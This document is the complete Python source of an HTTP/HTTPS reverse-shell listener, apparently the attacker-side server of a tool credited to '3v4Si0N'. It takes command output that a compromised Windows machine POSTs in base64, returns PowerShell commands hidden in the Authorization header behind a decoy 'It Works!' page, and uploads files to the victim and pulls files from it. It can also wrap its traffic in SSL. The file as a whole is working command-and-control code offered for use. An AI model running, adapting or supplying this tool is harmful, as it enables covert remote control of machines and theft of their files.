#!/usr/bin/python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import base64
from termcolor import colored
import urllib.parse
import time
import readline
import ssl
import argparse

readline.parse_and_bind("tab: complete")
PWD = "pwd | Format-Table -HideTableHeaders"

"""
    For HTTPS Server
        Create certificate using the commands:
                - openssl genrsa -out private.pem 2048
                - openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
"""


class myHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        self.send_response(200)
        self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
        return

    def do_POST(self):
        self.send_response(200)
        html = "<html><body><h1>It Works!</h1></body></html>"

        result = self.parseResult()
        pwd = self.getPwd(result)

        if (self.isDownloadFunctCalled(result)):
            filename, result, output = self.parseDownload(result)
            functions = Functions()
            functions.download(filename, result, output)
        else:
            self.printResult(result)
            pass

        command = self.newCommand(pwd)
        self.sendCommand(command, html)
        return

    def parseResult(self):
        content_len = int(self.headers.get('Content-Length', 0))
        test_data = self.rfile.read(content_len)
        result = (test_data[7:]).decode('utf-8')

        try:
            result = urllib.parse.unquote(result)
            result = (base64.b64decode(result)).decode('utf-8')
        except:
            pass

        result = result.split('\r\n\r\n')
        #print (result)
        if result[0] != "start":
            del result[-1]
        return result

    def parseDownload(self, result):
        downloaded_file_path = ""
        try:
            output = result[2]
            downloaded_file_path = result[1]
            result=result[0].split("D0wnL04d")[1]
        except IndexError:
            pass

        return downloaded_file_path, result, output

    def getPwd(self, result):
        if result[0] == "":
            del result[0]
        pwd = result[-1].strip()
        del result[-1] # Deleting pwd from result
        return pwd

    def printResult(self, result):
        for string in result:
            print(colored(string, 'white'))

    def isDownloadFunctCalled(self, result):
        iscalled = False
        try:
            if ("D0wnL04d" in result[0]):
                iscalled = True
        except IndexError:
            pass
        return iscalled

    def newCommand(self, pwd):
        if (pwd == "start"):
            input(colored("[!] New Connection, please press ENTER!",'red'))
            command = PWD
        else:
            command = input(colored("PS {}> ".format(pwd), "blue")) + " ;" + PWD
        return command

    def sendCommand(self, command, html, content=""):
        if (command.split(" ")[0] == "upload"):
            functions = Functions()
            try:
                upload = command.split(" ;")[0]
                filename = upload.split(" ")[1]
                content = functions.upload(filename)
                html = content.decode('utf-8')
            except AttributeError:
                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
                command = PWD
            except IndexError:
                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
                command = PWD

        elif (command.split(" ")[0] == "download"):
            try:
                download = command.split(" ;")[0]
                srcFile = download.split(" ")[1]
                dstFile = download.split(" ")[2]
            except IndexError:
                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
                print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
                command = PWD

        CMD = base64.b64encode(command.encode())
        self.send_header('Authorization',CMD.decode('utf-8'))
        self.end_headers()
        self.wfile.write(html.encode())


class Functions():
    def upload(self, filename):
        try:
            with open(filename, mode='rb') as file: # b is important -> binary
                content = file.read()
                return base64.b64encode(content)
        except FileNotFoundError:
            print (colored("\r\n[!] Source file not found!", "red"))

    def download(self, filename, content, output):
        try:
            with open(filename, mode='wb') as file: # b is importante -> binary
                content = base64.b64decode(content)
                file.write(content)
                print(colored(output, "green"))
        except:
            print (colored("\r\n[!] Error: Writing file!", "red"))

def main():

    banner = """
██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                         By: 3v4Si0N
    """
    print (colored(banner, 'yellow'))
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('host', help='Listen Host', type=str)
    parser.add_argument('port', help='Listen Port', type=int)
    parser.add_argument('--ssl', default=False, action="store_true", help='Send traffic over ssl')
    args = parser.parse_args()

    try:
        HOST = args.host
        PORT = args.port
        server = HTTPServer((HOST, PORT), myHandler)
        print(time.asctime(), 'Server UP - %s:%s' % (HOST, PORT))

        if (args.ssl):
            server.socket = ssl.wrap_socket (server.socket, certfile='certificate/cacert.pem', keyfile='certificate/private.pem', server_side=True)

        server.serve_forever()

    except KeyboardInterrupt:
        print (' received, shutting down the web server')
        server.socket.close()

main()
